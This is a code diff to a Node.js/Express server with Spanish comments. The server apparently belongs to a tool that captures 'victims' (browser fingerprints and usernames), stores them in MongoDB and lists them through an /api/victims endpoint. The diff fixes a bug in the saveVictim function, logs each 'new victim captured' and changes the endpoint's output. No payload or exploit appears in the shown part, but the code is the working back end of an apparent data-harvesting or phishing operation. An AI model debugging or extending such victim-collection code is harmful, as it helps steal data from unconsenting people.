@@ -147,7 +147,7 @@ async function isAlreadyCaptured(fingerprint) {
   }
 }
 
-// Guardar víctima en MongoDB
+// Guardar víctima en MongoDB (FIXED VERSION)
 async function saveVictim(victimData) {
   try {
     // Validación
@@ -161,17 +161,22 @@ async function saveVictim(victimData) {
       return false;
     }
 
+    // ✅ FIX: Store values in local variables BEFORE any MongoDB operations
+    const fingerprint = victimData.fingerprint;
+    const username = victimData.username || 'Unknown';
+    
     victimData.timestamp = new Date();
     await victimsCollection.insertOne(victimData);
     
-    const fingerprintPreview = victimData.fingerprint.substring(0, 8);
-    const usernameDisplay = victimData.username || 'Unknown';
+    // ✅ FIX: Use local variable instead of victimData.fingerprint
+    const fingerprintPreview = fingerprint.substring(0, 8);
     
-    console.log(`🎯 Nueva víctima capturada: ${usernameDisplay} [${fingerprintPreview}...]`);
+    console.log(`🎯 Nueva víctima capturada: ${username} [${fingerprintPreview}...]`);
     return true;
     
   } catch (error) {
     if (error.code === 11000) {
+      // ✅ Already had safe optional chaining here
       const fingerprintPreview = victimData.fingerprint?.substring(0, 8) || 'Unknown';
       console.log(`⚠️ Víctima duplicada ignorada: ${fingerprintPreview}...`);
       return false;
@@ -336,7 +341,7 @@ app.get('/api/stats', async (req, res) => {
 app.get('/api/victims', async (req, res) => {
   try {
     const victims = await getVictims();
-    res.json({ victims, total: victims.length });
+    res.json(victims);
   } catch (error) {
     console.error('Error en /api/victims:', error);
     res.status(500).json({ error: 'Internal server error' });
